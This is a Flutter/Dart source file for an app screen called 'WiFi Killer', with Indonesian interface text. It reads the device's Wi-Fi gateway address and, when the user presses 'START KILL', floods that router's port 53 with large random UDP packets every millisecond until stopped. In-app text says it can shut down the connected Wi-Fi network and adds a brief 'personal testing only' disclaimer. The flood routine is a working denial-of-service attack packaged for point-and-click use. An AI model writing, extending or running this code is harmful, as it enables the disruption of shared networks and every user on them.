import 'dart:async';
import 'dart:io';
import 'dart:math';
import 'package:flutter/material.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:network_info_plus/network_info_plus.dart';

class WifiKillerPage extends StatefulWidget {
  const WifiKillerPage({super.key});

  @override
  State<WifiKillerPage> createState() => _WifiKillerPageState();
}

class _WifiKillerPageState extends State<WifiKillerPage> {
  String ssid = "-";
  String ip = "-";
  String frequency = "-";
  String routerIp = "-";
  bool isKilling = false;
  Timer? _loopTimer;

  // 🎨 PALETTE BIRU - Oceanic Blue
  final Color primaryDark = const Color(0xFF0A1929);      // Dark navy blue
  final Color primaryBlue = const Color(0xFF2B4F8C);      // Medium blue
  final Color accentBlue = const Color(0xFF1E3A6F);       // Dark blue accent
  final Color lightBlue = const Color(0xFF4A7DB5);        // Light blue
  final Color softWhite = const Color(0xFFF0F4FA);        // Soft white with blue tint
  final Color cardBlue = const Color(0xFF13263E);         // Card background blue
  final Color tealAccent = const Color(0xFF1B9C9C);       // Teal accent
  final Color cyanLight = const Color(0xFF4ECDC4);        // Cyan light

  @override
  void initState() {
    super.initState();
    _loadWifiInfo();
  }

  Future<void> _loadWifiInfo() async {
    final info = NetworkInfo();

    final status = await Permission.locationWhenInUse.request();
    if (!status.isGranted) {
      _showAlert("Permission Denied", "Akses lokasi diperlukan untuk membaca info WiFi.");
      return;
    }

    try {
      final name = await info.getWifiName();
      final ipAddr = await info.getWifiIP();
      final gateway = await info.getWifiGatewayIP();

      setState(() {
        ssid = name ?? "-";
        ip = ipAddr ?? "-";
        routerIp = gateway ?? "-";
        frequency = "-";
      });
    } catch (e) {
      setState(() {
        ssid = ip = frequency = routerIp = "Error";
      });
    }
  }

  void _startFlood() {
    if (routerIp == "-" || routerIp == "Error") {
      _showAlert("❌ Error", "Router IP tidak tersedia.");
      return;
    }

    setState(() => isKilling = true);
    _showAlert("✅ Started", "WiFi Killer!\nStop Manually.");

    const targetPort = 53;
    final List<int> payload = List<int>.generate(65495, (_) => Random().nextInt(256));

    _loopTimer = Timer.periodic(Duration(milliseconds: 1), (_) async {
      try {
        for (int i = 0; i < 2; i++) {
          final socket = await RawDatagramSocket.bind(InternetAddress.anyIPv4, 0);
          for (int j = 0; j < 9; j++) {
            socket.send(payload, InternetAddress(routerIp), targetPort);
          }
          socket.close();
        }
      } catch (_) {}
    });
  }

  void _stopFlood() {
    setState(() => isKilling = false);
    _loopTimer?.cancel();
    _loopTimer = null;
    _showAlert("🛑 Stopped", "WiFi flood attack dihentikan.");
  }

  void _showAlert(String title, String message) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: cardBlue,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: cyanLight.withOpacity(0.3)),
        ),
        title: Text(
          title,
          style: TextStyle(
            color: cyanLight,
            fontSize: 18,
            fontWeight: FontWeight.bold,
            fontFamily: 'Orbitron',
          ),
        ),
        content: Text(
          message,
          style: TextStyle(
            color: softWhite,
            fontSize: 16,
            fontFamily: 'ShareTechMono',
          ),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: Text("OK", style: TextStyle(color: cyanLight)),
          ),
        ],
      ),
    );
  }

  Widget _infoRow(String label, String value) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 4),
      child: Row(
        children: [
          Text("$label: ", style: TextStyle(color: softWhite.withOpacity(0.7), fontWeight: FontWeight.bold)),
          Expanded(child: Text(value, style: TextStyle(color: softWhite))),
        ],
      ),
    );
  }

  @override
  void dispose() {
    _stopFlood();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: primaryDark,
      appBar: AppBar(
        backgroundColor: primaryDark,
        iconTheme: IconThemeData(color: softWhite),
        title: Text("📡 WiFi Killer", style: TextStyle(fontFamily: 'Orbitron', color: softWhite)),
      ),
      body: Padding(
        padding: const EdgeInsets.all(25),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text(
              "WiFi Killer",
              style: TextStyle(
                color: cyanLight,
                fontSize: 22,
                fontWeight: FontWeight.bold,
                fontFamily: 'Orbitron',
              ),
            ),
            const SizedBox(height: 10),
            const Text(
              "Feature ini mampu mematikan jaringan WiFi yang anda sambung.\n⚠️ Gunakan hanya untuk testing pribadi. Risiko ditanggung pengguna.",
              style: TextStyle(color: Colors.white70, fontSize: 14),
            ),
            const SizedBox(height: 20),
            Container(
              decoration: BoxDecoration(
                color: cardBlue,
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: cyanLight.withOpacity(0.5)),
              ),
              padding: const EdgeInsets.all(16),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  _infoRow("SSID", ssid),
                  _infoRow("IP", ip),
                  _infoRow("Freq", "$frequency MHz"),
                  _infoRow("Router", routerIp),
                ],
              ),
            ),
            const SizedBox(height: 40),
            Center(
              child: Container(
                decoration: BoxDecoration(
                  borderRadius: BorderRadius.circular(25),
                  gradient: isKilling 
                      ? null
                      : LinearGradient(
                          colors: [primaryBlue, cyanLight],
                          begin: Alignment.centerLeft,
                          end: Alignment.centerRight,
                        ),
                  boxShadow: isKilling
                      ? null
                      : [
                          BoxShadow(
                            color: cyanLight.withOpacity(0.5),
                            blurRadius: 15,
                            offset: Offset(0, 5),
                          ),
                        ],
                ),
                child: ElevatedButton.icon(
                  onPressed: isKilling ? _stopFlood : _startFlood,
                  style: ElevatedButton.styleFrom(
                    backgroundColor: isKilling ? Colors.grey : Colors.transparent,
                    foregroundColor: softWhite,
                    padding: const EdgeInsets.symmetric(horizontal: 40, vertical: 15),
                    shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(25)),
                    elevation: isKilling ? 0 : 0,
                    shadowColor: Colors.transparent,
                  ),
                  icon: Icon(isKilling ? Icons.stop : Icons.wifi_off, color: softWhite),
                  label: Text(
                    isKilling ? "STOP" : "START KILL",
                    style: TextStyle(fontSize: 16, letterSpacing: 2, fontFamily: 'Orbitron', color: softWhite),
                  ),
                ),
              ),
            ),
            const SizedBox(height: 20),
            if (isKilling)
              Center(
                child: CircularProgressIndicator(color: cyanLight),
              ),
          ],
        ),
      ),
    );
  }
}